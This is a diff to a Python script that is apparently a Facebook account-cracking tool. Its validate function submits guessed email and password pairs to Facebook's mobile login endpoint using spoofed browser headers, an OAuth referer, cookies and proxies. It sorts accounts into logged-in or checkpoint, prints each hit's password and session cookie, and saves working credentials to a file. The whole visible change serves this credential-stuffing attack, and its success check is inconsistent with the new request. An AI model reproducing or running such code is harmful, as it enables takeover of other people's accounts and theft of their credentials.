@@ -1128,30 +1128,41 @@ def validate(idf, pwv,awal):
                         'is_smart_lock': 'false', 
                         'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
                         }
-
-                r.headers.update({
-                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
-                        'sec-fetch-site': 'same-origin',
-                        'origin': 'https://m.alpha.facebook.com',
-                        'accept': '*/*',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-                        'referer': 'https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified',
-                        'content-length': f"{len(str(data))}"
-                    })
+                heade={
+			"Host": "m.alpha.facebook.com",
+			"content-length": f"{len(str(data))}",
+			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
+			"origin": "https://m.alpha.facebook.com",
+			"content-type": "application/x-www-form-urlencoded",
+			"user-agent": ua,
+			"accept": "*/*",
+			"x-requested-with": "com.microsoft.bing",
+			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+			"sec-ch-ua-platform": '"Android"',
+			"sec-ch-ua-mobile": "?1",
+			"sec-fetch-site": "same-origin",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-user": "?1",
+			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
+			"accept-encoding": "gzip, deflate br",
+			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+			}
                 response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
-                #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
+                po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                 if 'c_user' in r.cookies.get_dict().keys():
                     try:
                         cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                     except:pass
+                    ok+=1
                     tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                     tree.add(f"[bold green]Email : {idf}").add(f"[bold green]Password : {pw}", style = "bold white")
                     tree.add(f"[bold green]Cookie : {cookie}", style = "bold white")
                     print(tree)
                     open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                     break
-                elif 'checkpoint' in r.cookies.get_dict().keys():
+                elif 'checkpoint' in po.cookies.get_dict().keys():
+                    cp+=1
                     tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                     tree.add(f"[bold red]Email : {idf}").add(f"[bold red]Password : {pw}", style = "bold white")
                     tree.add(f"[bold red]Useragent : {ua}", style = "bold white")
